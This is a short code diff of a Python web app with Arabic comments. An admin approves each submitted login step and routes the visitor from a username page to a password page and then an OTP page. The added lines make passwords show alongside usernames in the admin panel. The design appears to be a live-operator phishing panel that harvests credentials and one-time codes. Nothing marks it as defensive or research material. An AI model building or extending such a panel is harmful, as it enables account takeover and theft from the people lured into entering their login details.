@@ -208,10 +208,10 @@ def admin_approve_login(user_session_id):
     if latest_req:
         latest_req.status = "approved"
         latest_req.admin_action_time = datetime.datetime.now()
-        # تحديد التوجيه التلقائي بناء على نوع الطلب
+        # التوجيه الصحيح لكل خطوة
         if latest_req.type == 'username':
             user.redirect_to = "password.html"
-        elif latest_req.type == 'password':
+        elif latest_req.type in ('login', 'password'):
             user.redirect_to = "otp.html"
     db.session.commit()
     return jsonify({"status": "success", "message": "تمت الموافقة بنجاح"})
@@ -298,6 +298,7 @@ def submit_request():
         auto_approve = request_type in ("personal_info", "watch_request")
         initial_status = "approved" if auto_approve else "pending"
 
+        # إذا كانت كلمة المرور، نقوم بدمج بياناتها مع نفس السجل للمستخدم لتظهر مع اسم المستخدم في لوحة الأدمن
         new_req = ClientRequest(
             user_id=user.id,
             type=request_type,
